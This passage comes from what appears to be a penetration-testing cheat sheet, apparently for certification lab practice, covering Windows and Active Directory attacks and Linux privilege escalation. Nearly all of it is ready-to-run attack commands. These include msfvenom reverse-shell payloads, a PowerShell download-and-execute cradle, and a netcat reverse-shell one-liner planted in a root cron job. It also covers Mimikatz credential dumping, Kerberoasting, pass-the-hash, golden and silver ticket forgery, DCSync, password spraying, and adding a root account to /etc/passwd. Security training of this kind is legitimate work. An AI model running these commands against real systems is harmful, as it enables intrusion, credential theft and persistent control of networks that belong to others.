        ```

        <br></br>
        <b>Add New User</b>

        ```
        net user afsimmons enterpasswordhere /add
        ```

        <br></br>
        <b>Add User to LocalGroup</b>

        ```
        net localgroup Administrators afsimmons
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Bypassing AV</summary>

    +
        <b>PowerShell Exploit</b>

        ```
        https://github.com/giddings32/Scripts/blob/main/AV_Evasion/in_memory_injection.ps1
        ```
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f powershell
        ```

        <b>Windows Powershell: Change Execution Policy</b>

        ```
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
        ```
        ```
        Get-ExecutionPolicy -Scope CurrentUser
        ```

        <b>Listener</b>

        ```
        msfconsole -x "use exploit/multi/handler; set RHOST x.x.x.x; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST x.x.x.x"
        ```
        ```
        exploit
        ```

        <br></br>
    </details>
    
    
    <details>
    <summary>Mimikatz</summary>

    + 
        <br></br>
        <b>Post exploitation commands must be executed from SYSTEM level privileges.</b>

        ```
        privilege::debug
        ```
        ```
        token::whoami
        ```
        ```
        token::elevate
        ```
        ```
        token::elevate /domainadmin
        ```
        ```
        lsadump::sam
        ```
        ```
        sekurlsa::logonpasswords
        ```

        <br></br>
        <b>Pass The Hash</b>


        ```
        pth-winexe -U [USERNAME]%[LM_HASH]:[NTLM_HASH] //x.x.x.x cmd
        ```

        <li><b>aad3b435b51404eeaad3b435b51404ee</b> Blank LM Hash if running against OS newer than Vista</li>

        ```
        sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
        ```

        <br></br>
        <b>Inject generated TGS key</b>

        ```
        kerberos::ptt <ticket_kirbi_file>
        ```

        <br></br>
        <b>Generating a silver ticket: AES 256 Key</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```

        <b>Generating a silver ticket: AES 128 Key</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```

        <b>Generating a silver ticket: NTLM</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
        ```



        <br></br>
        <b>## Generating a Golden Ticket: AES 256 Key</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
        ```

        <b>## Generating a Golden Ticket: AES 128 Key</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
        ```

        <b>## Generating a Golden Ticket: NTLM</b>

        ```
        kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
        ```

        <br></br>
    </details>

    
    <details>
    <summary>Active Directory</summary>

    + <details>
        <summary>Enumeration</summary>

        + <details>
            <summary>Traditional Approach</summary>

            +
                <b>From Target workstation: Enumerate all Local accounts</b>

                ```
                net user
                ```

                <b>From Target workstation: Enumerate all users on entire domain</b>

                ```
                net user /domain
                ```

                <b>From Target workstation: Query Individual Users</b>

                ```
                net user [User_Name] /domain
                ```

                <b>From Target workstation: Enumerate all groups on entire domain</b>

                ```
                net group /domain
                ```

            </details>

            <details>
            <summary>Modern Approach</summary>

            +
                <b>From Target workstation as user@domain: Powershell: Discover the HostName of the DC and the components of the DistinguishedName</b>

                ```
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
                ```

                <br></br>
                <b>From Target workstation: Powershell: Build LDAP Provider Path</b>

                ```
                notepad enumerateUsers.ps1
                ```
                ```
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
                $PDC = ($domainObj.PdcRoleOwner).Name
                $SearchString = "LDAP://"
                $SearchString += $PDC + "/"
                $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
                $SearchString += $DistinguishedName
                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                $Searcher.SearchRoot = $objDomain
                $Searcher.filter="samAccountType=805306368"
                $Searcher.FindAll()
                ```
                ```
                .\enumerateUsers.ps1
                ```

                <br></br>
                <b>Enumerate logged-in users on a client</b>

                ```
                Get-NetLoggedon -ComputerName <client name>
                ```

                <br></br>
                <b>Enumerate active sessions on domain controller or file server</b>

                ```
                Get-NetSession -ComputerName <server name>
                ```

                <br></br>
            </details>

            <details>
            <summary>Dealing With Nested Groups</summary>

            +
                <b>Log in as Domain User</b>

                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```

                <br></br>

                <b>List Groups in Domain</b>            

                ```
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

                $PDC = ($domainObj.PdcRoleOwner).Name

                $SearchString = "LDAP://"

                $SearchString += $PDC + "/"

                $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

                $SearchString += $DistinguishedName

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

                $objDomain = New-Object System.DirectoryServices.DirectoryEntry

                $Searcher.SearchRoot = $objDomain

                $Searcher.filter="(objectClass=Group)"

                $Result = $Searcher.FindAll()

                Foreach($obj in $Result)
                {
                    $obj.Properties.name
                }
                ```

                <b>Example Results</b>

                ```
                Key Admins
                Enterprise Key Admins
                DnsAdmins
                DnsUpdateProxy
                Secret_Group
                Nested_Group
                Another_Nested_Group
                ```

                <br></br>
                <b>List Members of Group in Domain</b> 

                ```
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

                $PDC = ($domainObj.PdcRoleOwner).Name

                $SearchString = "LDAP://"

                $SearchString += $PDC + "/"

                $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

                $SearchString += $DistinguishedName

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

                $objDomain = New-Object System.DirectoryServices.DirectoryEntry

                $Searcher.SearchRoot = $objDomain

                $Searcher.filter="(name=Secret_Group)"

                $Result = $Searcher.FindAll()

                Foreach($obj in $Result)
                {
                    $obj.Properties.member
                }
                ```

                <b>Example Results</b>

                ```
                CN=Nested_Group,OU=CorpGroups,DC=corp,DC=com
                ```

                <br></br>
                <b>List Members of Nested Group 1 in Domain</b>

                ```
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

                $PDC = ($domainObj.PdcRoleOwner).Name

                $SearchString = "LDAP://"

                $SearchString += $PDC + "/"

                $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

                $SearchString += $DistinguishedName

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

                $objDomain = New-Object System.DirectoryServices.DirectoryEntry

                $Searcher.SearchRoot = $objDomain

                $Searcher.filter="(name=Nested_Group)"

                $Result = $Searcher.FindAll()

                Foreach($obj in $Result)
                {
                    $obj.Properties.member
                }

                ```

                <b>Example Results</b>

                ```
                CN=Another_Nested_Group,OU=CorpGroups,DC=corp,DC=com
                ```

                <br></br>
                <b>List Members of Nested Group 2 in Domain</b>

                ```
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

                $PDC = ($domainObj.PdcRoleOwner).Name

                $SearchString = "LDAP://"

                $SearchString += $PDC + "/"

                $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

                $SearchString += $DistinguishedName

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

                $objDomain = New-Object System.DirectoryServices.DirectoryEntry

                $Searcher.SearchRoot = $objDomain

                $Searcher.filter="(name=Another_Nested_Group)"

                $Result = $Searcher.FindAll()

                Foreach($obj in $Result)
                {
                    $obj.Properties.member
                }
                ```

                <b>Example Results</b>

                ```
                CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com
                ```

            </details>


            <details>
            <summary>Currently Logged in Users</summary>

            +
                <b>Finding logged in users of High value groups: Credentials will be cached in memory</b>  

                <br></br>
                <b>Option 1: NetWKstaUserEnum: Requires Admin Priv: List all users logged onto target workstation: After compromising Domain machine Enum all workstations and then use netWKstaUserEnum on all machines found</b>

                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```
                ```
                Set-ExecutionPolicy Unrestricted
                ```

                <b>Run Powerview from memory</b>

                ```
                https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
                ```
                ```
                sudo vim /var/www/html/PowerView.ps1
                ```

                <li>Paste Powerview contents to file and paste command you want to use with it from below</li>

                ```
                powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/PowerView.ps1')"
                ```

                <b>Run Powerview From file on windows</b> 

                ```
                Import-Module .\PowerView.ps1
                ```

                <b>Enumerate Computer Names</b>

                ```
                .\enumerateComputer.ps1
                ```
                ```
                https://github.com/giddings32/Scripts/blob/main/Active_Directory/enumerateComputers.ps1
                ```


                <b>Enumerate logged in Users</b>

                ```
                Get-NetLoggedon -ComputerName client251
                ```

                <b>Example Results</b>

                ```
                offsec         corp                                 DC01
                offsec         corp                                 DC01
                CLIENT251$     corp
                ```

                <br></br>
                <b>Option 2: NetSessionEnum: Requires only Regular Domain user: Return List of active user sessions on filerservers and domain controllers</b>

                ```
                Import-Module .\PowerView.ps1
                ```

                <b>Enumerate Active Sessions on Domain Controller</b>

                ```
                Get-NetSession -ComputerName dc01
                ```

                <b>Example Results</b>

                ```
                \\192.168.1.111 CLIENT251$                8                8
                \\[::1]      DC01$                        6                6
                \\192.168.1.111 offsec                    0                0
                ```


            </details>

            <details>
            <summary>Enumeration through Service Principle Names</summary>

            +
                <b>Remote Desktop into client</b>

                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```
                ```
                powershell
                ```
                ```
                Set-ExecutionPolicy Unrestricted
                ```

                <b>copy and paste Enumeration Script from here here</b>

                ```
                https://github.com/giddings32/Scripts/blob/main/Active_Directory/enumerateServicePrincipleNames.ps1
                ```
                ```
                notepad enumerateServicePrincipleName.ps1
                ```

                <b>Run Script</b>

                ```
                .\enumerateServicePrincipleName.ps1
                ```

                <li>Relevant Information: samaccountname:  &  serviceprincipalname</li>

                <b>Resolve Webserver</b>

                ```
                nslookup <webserver>.com
                ```

                <br></br>
                <b>Using GetSPN</b>

                ```
                https://github.com/giddings32/Scripts/blob/main/Active_Directory/Get-SPN.ps1
                ```
                ```
                notepad Get-SPN.ps1
                ```
                ```
                powershell
                ```
                ```
                Set-ExecutionPolicy Unrestricted
                ```
                ```
                . .\Get-SPN.ps1
                ```
                ```
                 Get-SPN -type service -search "*"
                ```
                <br></br>
            </details>
        </details>

        <details>
        <summary>Authentication</summary>

        + <details>
            <summary>Cached Credential Storage and Retrieval</summary>

            <b>Current Versions of Windows Hashes stored LSASS(Local Security Authority Subsystem Service)</b>

            ```
            cmd as administrator
            ```
            ```
            mimikatz
            ```
            ```
            privilege::debug
            ```
            ```
            sekurlsa::logonpasswords
            ```

            <br></br>
            <b>Show current user tickets stored in memory</b>


            ```
            cmd as administrator
            ```
            ```
            mimikatz
            ```
            ```
            privilege::debug
            ```
            ```
            sekurlsa::tickets
            ```

            <br></br>
            </details>

            <details>
            <summary>Service Account Attacks</summary>

            +
                <b>Sign into domain</b>

                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```
                ```
                powershell
                ```

                <b>Request Service Ticket</b>

                ```
                Add-Type -AssemblyName System.IdentityModel
                ```
                ```
                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<ServerName>.<Domain>.com'
                ```

                <b>Display all cached Kerberos Tickets for current user</b>

                ```
                klist
                ```

                <b>Download Ticket from memory</b>

                ```
                mimikatz
                ```
                ```
                privilege::debug
                ```
                ```
                kerberos::list /export
                ```

                <b>Service Ticket Example</b>

                ```
                1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
                ```

                <b>Alternative Method</b>

                ```
                Import-Module .\Invoke-Kerberoast.ps1
                ```
                ```
                Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt
                ```

                <b>Transfer File to Kali machine</b>

                ```
                ftp <Kali IP>
                ```
                ```
                bin
                ```
                ```
                put <Ticket_name_of_saved_to_File>
                ```


                <b>Installing Kerberoast</b>

                ```
                sudo apt update && sudo apt install kerberoast
                ```
                ```
                https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
                ```

                <b>Cracking .kirbi with Kerberoast</b>

                ```
                /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt *.kirbi
                ```

                <b>Cracking .kirbi with Jack the Ripper</b>

                ```
                kirbi2john *.kirbi > kirbi1
                ```
                ```
                john --format=krb5tgs kirbi1 --wordlist=/usr/share/wordlists/rockyou.txt
                ```

                <br></br>
            </details>

            <details>
            <summary>Low and Slow Password Guessing</summary>

            +
                <b>Account Policy for Domain</b>

                ```
                net accounts
                ```

                <li>Lockout Threshold: = # of attempts before lockout</li>
                <li>Lockout observation window (minutes): = After # of minutes get 1 more login attempt</li>

                <b>Spray-Passwords.ps1</b>

                ```
                https://github.com/giddings32/Scripts/blob/main/Active_Directory/Spray-Passwords.ps1
                ```

                ```
                .\Spray-Passwords.ps1 -Url http://<kali-IP>/rockyou.txt -Admins
                ```
                ```
                .\Spray-Passwords.ps1 -File rockyou.txt -Admin
                ```

                <br></br>
            </details>
        </details>

        <details>
        <summary>Lateral Movement</summary>

        + <details>
            <summary>Pass The Hash: Only works with NTLM Authentication not Kerberos</summary>

            +
                <b>From Kali: Passing-The-Hash Toolkit</b>

                ```
                pth-winexe -U <USERS_NTLM_HASH> //x.x.x.x cmd
                ```
                ```
                pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //x.x.x.x cmd
                ```

                <br></br>
                <b>Impacket-wmiexec</b>


                ```
                impacket-secretsdump 'domain/<user>@x.x.x.x'
                ```
                ```
                impacket-wmiexec <domain>/<user>@x.x.x.x -hashes <hash>
                ```

            </details>

            <details>
            <summary>Overpass the Hash</summary>

             +
                <b>Gain Full Kerberos Ticket Granting Ticket/Service Ticket</b>


                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```

                <b>Find NTLM Hash of User</b>

                ```
                .\mimikatz
                ```
                ```
                privilege::debug
                ```
                ```
                sekurlsa::logonpasswords
                ```

                <b></b>

                ```
                sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN_NAME> /ntlm:<NTLM_HASH> /run:Powershell.exe
                ```

                <b>Auth to network share to generate TGT</b>

                ```
                net use \\<Domain Controller>
                ```
                ```
                klist
                ```

                <b>Obtain Code execution with TGT</b>

                ```
                .\PsExec.exe \\<Domain Controller> cmd.exe
                ```

            </details>

            <details>
            <summary>Pass the Ticket</summary>

             +
                <b>Unlike TGT, TGS Can be exported and reinjected somewhere else on network. No additional access granted</b>
                <br></br>

                ```
                rdesktop x.x.x.x -u <user>@<domain> -p <password>
                ```
                ```
                cmd as admin
                ```

                <b>Get SID of Domain: SID = String minus -1104</b>

                ```
                whoami /user
                ```

                <b>Grabbing Password Hash of user</b>

                ```
                mimikatz
                ```
                ```
                privilege::debug
                ```
                ```
                sekurlsa::logonpasswords
                ```

                <b>Purge any existing Kerberos Tickets</b>

                ```
                kerberos::purge
                ```
                ```
                kerberos::list
                ```

                <b>Creating a Silver Ticket</b>

                ```
                kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<SID> /target:<FQ_HostName> /service:HTTP /rc4:<PassHass of iis service> /ptt
                ```
                
                <b>Example</b>
                
                ```
                kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
                ```
                
                ```
                kerberos::list
                ```

                <b>Now that ticket is loaded into memory we can interact with service to gain access to information</b>

                <br></br>
            </details>

            <details>
            <summary>Distributed Component Object Model</summary>

             +
                <b>Remotedesktop into client</b>

                ```
                rdesktop x.x.x.x -u <Local_Admin_User>@<domain> -p <password>
                ```

                <b>Discover Available Methods/sub-objects for DCOM object</b>

                ```
                powershell
                ```
                ```
                $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<Remote_Workstation_IP>"))
                ```

                <b>Discover available methods: Look for Run</b>

                ```
                $com | Get-Member
                ```

                <b>Create Reverse Shell to be used with Macro</b>

                ```
                msfvenom -p windows/shell_reverse_tcp LHOST=<Windows_Client_Second_Interface_IP> LPORT=4444 -f hta-psh -o evil.hta
                ```
                ```
                cat evil.hta
                ```

                <la>Copy From "powershell.exe -nop .....Payload"</la>

                <b>Python Split command into smaller Chunks</b>

                ```
                str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

                n = 50

                for i in range(0, len(str), n):
                    print "Str = Str + " + '"' + str[i:i+n] + '"'
                ```

                <li>Copy Str = Str + "..." output</li>

                <b>Create Excel File > View > Macros > mymacro > Create > Paste contents below > Save > Save as type: Excel 97-2003 Workbook (*.xls) > File name: myexcel.xls > Save</b>

                ```
                Sub mymacro()
                    Dim Str As String

                    <PASTE CONTENT>
                    CreateObject("Wscript.Shell").Run Str

                End Sub
                ```

                <b>Setup Listener on Windows machine</b>

                ```
                nc.exe -nlvp 4444
                ```

                <b>Copy excel doc to remote computer : Change <USERNAME> and <Remote_Workstation_IP></b>

                ```
                https://raw.githubusercontent.com/giddings32/Scripts/main/Active_Directory/exceldcom.ps1
                ```
                ```
                powershell
                ```
                ```
                Set-ExecutionPolicy Unrestricted
                ```
                ```
                .\exceldcom.ps1
                ```

                <br></br>
            </details>
        </details>

        <details>
        <summary>Persistence</summary>

        + <details>
            <summary>Golden Tickets</summary>

            +
                <b>Remotedesktop into client</b>

                ```
                rdesktop x.x.x.x -u <Local_Admin_User>@<domain> -p <password>
                ```
                ```
                cmd as admin
                ```

                <b>Write Down SID of Domain: SID = String minus -1104</b>

                ```
                whoami /user
                ```

                <b>Remote Desktop into DC</b>

                <br></br>
                <b>Admin Cmd: Write down Hash of krbtgt with mimikatz</b>

                ```
                mimikatz
                ```
                ```
                privilege::debug
                ```
                ```
                lsadump::lsa /patch
                ```

                <b>Leave DC Remote Desktop</b>
                <br></br>
                <b>Mimikatz</b>

                ```
                mimikatz
                ```
                ```
                privilege::debug
                ```

                <b>Delete any existing Kerberos tickets</b>

                ```
                kerberos::purge
                ```

                <b>Generate Golden Ticket</b>

                ```
                kerberos::golden /user:fakeuser /domain:<DOMAIN_NAME> /sid:<SID> /krbtgt:<HASH> /ptt
                ```

                <b>Launch new command prompt</b>

                ```
                misc::cmd
                ```

                <b>Lateral Movement to DC</b>

                ```
                psexec.exe \\dc01 cmd.exe
                ```
                ```
                ipconfig
                ```
                ```
                whoami
                ```
                ```
                whoami /groups
                ```

                <br></br>
            </details>

            <details>
            <summary>Domain Controller Synchronization</summary>

            +
                <b>Remotedesktop into client</b>

                ```
                rdesktop x.x.x.x -u <Local_Admin_User>@<domain> -p <password>
                ```
                ```
                cmd as admin
                ```

                <b>Write Down SID of Domain: SID = String minus -1104</b>

                ```
                whoami /user
                ```

                <b>Rogue Update Request to domain controller</b>

                ```
                mimikatz
                ```
                ```
                privilege::debug
                ```
                ```
                lsadump::dcsync /user:Administrator
                ```

                <br></br>
            </details>
        </details>

        <details>
        <summary>Anonymous Credential LDAP Dumping</summary>

        + 
            <br></br>

            ```
            ldapsearch -LLL -x -H ldap:// <domain fqdn="">-b ‘’ -s base ‘(objectclass=*)’</domain>
            ```

            <li><b>-LLL</b>&ensp;--&ensp;</li>
            <li><b>-x</b>&ensp;--&ensp;</li>
            <li><b>-H</b>&ensp;--&ensp;</li>
            <li><b>-s</b>&ensp;--&ensp;</li>
            <br></br>
        </details>
        
        <details>
        <summary>BloodHound</summary>

        + 
            <b>Install</b>

            ```
            apt install bloodhound
            ```

            <b>Gather Data</b>

            ```
            import-module .\sharphound.ps1
            ```
            ```
            invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password
            ```

            <br></br>
            <b>Pre-Compiled Binaries</b>

            ```
            https://github.com/BloodHoundAD/BloodHound/releases
            ```

            <b>SharpHound</b>

            ```
            https://github.com/BloodHoundAD/SharpHound3
            ```

            <b>Source</b>

            ```
            https://github.com/BloodHoundAD/BloodHound
            ```

            <b>Bloodhound for Python 3.0 or Higher</b>

            ```
            https://github.com/fox-it/BloodHound.py
            ```

            <br></br>
        </details>

        <details>
        <summary>Impacket</summary>

        + 
            <b>Generate Silver Tickets with Impacket</b>

            ```
            python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
            ```
            ```
            python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
            ```

            <b>Generate Golden Tickets</b>

            ```
            python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>
            ```
            ```
            python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> <user_name>
            ```

            <b>Credential Access with Secretsdump</b>

            ```
            impacket-secretsdump username@target-ip -dc-ip target-ip
            ```
            
            <br></br>
        </details>

        <details>
        <summary>Rubeus</summary>

        + 
            <b>ASREProasting: Check for users in Current Domain</b>

            ```
            Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
            ```

            <br></br>
            <b>Kerberoasting:</b>

            ```
            Rubeus.exe kerberoast /outfile:<output_TGSs_file>
            ```
            ```
            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
            ```

            <br></br>
            <b>Pass the key (PTK):</b>

            ```
            .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
            ```

            <br></br>
            <b>Using the ticket on a Windows target:</b>

            ```
            Rubeus.exe ptt /ticket:<ticket_kirbi_file>
            ```

            <br></br>
        </details>
        
        
        <details>
        <summary>Impacket</summary>

        + 
            <b>Impacket GetADUsers.py (Must have valid credentials)</b>

            ```
            GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
            ```

            <li><b>-all</b>&ensp;--&ensp;</li>
            <li><b>-dc-ip</b>&ensp;--&ensp;</li>
            <br></br>

            <b>Impacket lookupsid.py:</b>

            ```
            /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@x.x.x.x
            ```

            <br></br>
            <b>Impacket Secretdump:</b>

            ```
            impacket-secretdump '<domain>/<user>@x.x.x.x' -just-dc-user <user>
            ```
            <li><b>-just-dc-user</b>&ensp;--&ensp;Optional User you want hashes of, Leave out if you want all</li>
            <br></br>

            <br></br>
        </details>
        
        <details>
        <summary>Impacket Kerberoasting</summary>

        + 
            <b>Install</b>

            ```
            apt install impacket-scripts
            ```

            <br></br>
            <b>Check for Kerberoasting</b>

            ```
            GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip x.x.x.x -format hashcat/john</ip>
            ```

            <li><b>-userfile</b>&ensp;--&ensp;</li>
            <li><b>-dc-ip</b>&ensp;--&ensp;</li>
            <li><b>-format</b>&ensp;--&ensp;</li>
            <br></br>

            <br></br>
            <b>GetUserSPNs: ASREPRoast</b>

            ```
            impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
            ```

            <li><b>-request</b>&ensp;--&ensp;</li>
            <li><b>-format</b>&ensp;--&ensp;</li>
            <li><b>-outputfile</b>&ensp;--&ensp;</li>
            <br></br>


            ```
            impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
            ```

            <li><b>-userfile</b>&ensp;--&ensp;</li>
            <li><b>-format</b>&ensp;--&ensp;</li>
            <li><b>-outputfile</b>&ensp;--&ensp;</li>
            <br></br>

            <b>GetUserSPNs: Kerberoasting</b>

            ```
            impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
            ```

            <li><b>-outputfile</b>&ensp;--&ensp;</li>
            <br></br>

            <b>GetUserSPNs: Overpass The Hash/Pass The Key (PTK)</b>

            ```
            python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
            ```

            <li><b>-hashes</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
            ```

            <li><b>-aesKey</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            python3 getTGT.py <domain_name>/<user_name>:[password]
            ```

            <br></br>
            <b>Using TGT key to excute remote commands from the following impacket scripts:</b>

            ```
            python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
            ```

            <li><b>-k</b>&ensp;--&ensp;</li>
            <li><b>-no-pass</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
            ```

            <li><b>-k</b>&ensp;--&ensp;</li>
            <li><b>-no-pass</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
            ```

            <li><b>-k</b>&ensp;--&ensp;</li>
            <li><b>-no-pass</b>&ensp;--&ensp;</li>
            <br></br>

            <b>Github Link</b>

            ```
            https://github.com/SecureAuthCorp/impacket
            ```

            <br>Local Locations:</br>

            ```
            /usr/share/doc/python3-impacket/examples
            ```

            <br></br>
        </details>
        
        <details>
        <summary>Windapsearch</summary>

        + 
            <br></br>

            ```
            python3 windapsearch.py -d host.domain -u domain\ldapbind -p PASSWORD -U
            ```

            <li><b>-d</b>&ensp;--&ensp;</li>
            <li><b>-u</b>&ensp;--&ensp;</li>
            <li><b>-p</b>&ensp;--&ensp;Password</li>
            <li><b>-U</b>&ensp;--&ensp;</li>
            <br></br>

            <b>Download Link</b>

            ```
            https://github.com/ropnop/windapsearch
            ```

        </details>
    </details>
</details>

<details>
<summary>Linux</summary>
    
+ <details>
    <summary>Priviledge Escalation Scripts</summary>

    + 
        <b>Linux: Linux Exploit Suggester 2</b>

        ```
        https://github.com/jondonas/linux-exploit-suggester-2
        ```

        <b>Linux: LinEnum</b>

        ```
        https://github.com/rebootuser/LinEnum
        ```

        <b>Linux: UnixPriv Checke</b>

        ```
        https://github.com/pentestmonkey/unix-privesc-check
        ```

        <b>Linux: LinPeas</b>

        ```
        https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
        ```

        <br></br>
    
    </details>
    
    <details>
    <summary>Linux Priv Esc</summary>

    + <details>
        <summary>Tools</summary>

        + <details>
            <summary>unix-privesc-check</summary>
                <b>unix-privesc-check</b>

                ```
                unix-privesc-check standard > output.txt
                ```
                ```
                unix-privesc-check detailed > output.txt
                ```
                ```
                grep "writable config" -A 8 output.txt
                ```

            </details>

            <details>
            <summary>Linux Smart Enumeration</summary>

            + 
                <b>Run With Default Options</b> 

                ```
                ./lse.sh
                ```

                <b>Do not ask me for Password and verbose level 1</b>

                ```
                ./lse.sh -l 1 -i
                ```

            </details>

            <details>
            <summary>LinEnum</summary>

            + 
                <b>Create Directory for LinEnum to copy files to</b> 

                ```
                mkdir export
                ```

                <b>Search for keyword Password with thorough test</b>

                ```
                ./LinEnum.sh -k password -e export =t
                ```

            </details>

        </details>

        <details>
        <summary>Insecure File Permissions</summary>

        + <details>
            <summary>Cron</summary>

            +

                <b>Locate Running Cron Jobs</b>
                <li>look for job running as root</li>

                ```
                grep "CRON" /var/log/cron.log
                ```
                ```
                ls -lah /etc/cron*
                ```

                <b>See if you have write priv</b>

                ```
                ls -lah /var/scripts/user_backups.sh
                ```

                <b>Add Reverse Shell One Liner</b>

                ```
                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 1234 >/tmp/f
                ```

                <b>Setting up a cronjob</b>

                ```
                cron -e
                ```
                ```
                1 * * * * root /path/to/file.sh
                ```

                <b>Set up Listener</b>

                ```
                sudo nc -nlvp 1234
                ```


            </details>

            <details>
            <summary>/etc/passwd</summary>

            +

                <li>If a password hash is located int /etc/passwd it takes precedence over /etc/shadow</li>
                <br></br>

                <b>See if /etc/passwd is writable</b>

                ```
                ls -lah /etc/passwd
                ```

                <b>Generate Password Hash</b>

                ```
                openssl passwd password123
                ```

                <b>Add User and Password hash to /etc/passwd</b>

                ```
                echo "root2:<PasswordHash>:0:0:root:/root:/bin/bash" >> /etc/passwd
                ```

                <b>Sign In</b>

                ```
                su root2
                ```

            </details>
        </details>

        <details>
        <summary>Kernel Exploits</summary>

        + <details>
            <summary>CVE-2017-1000112</summary>

            +
                <b>Enumerate System Information</b>

                <li>OS</li>

                ```
                cat /etc/issue
                ```

                <li>Kernel</li>

                ```
                uname -r
                ```

                <li>Architecture</li>

                ```
                arch
                ```

                <b>Finding Exploit Example</b>

                ```
                searchsploit linux kernel ubuntu 16.04
                ```

                <b>Move to victim machine</b>

                ```
                scp /usr/share/exploitdb/exploits/linux/local/43418.c <USER>@x.x.x.x:/home/<USER>
                ```

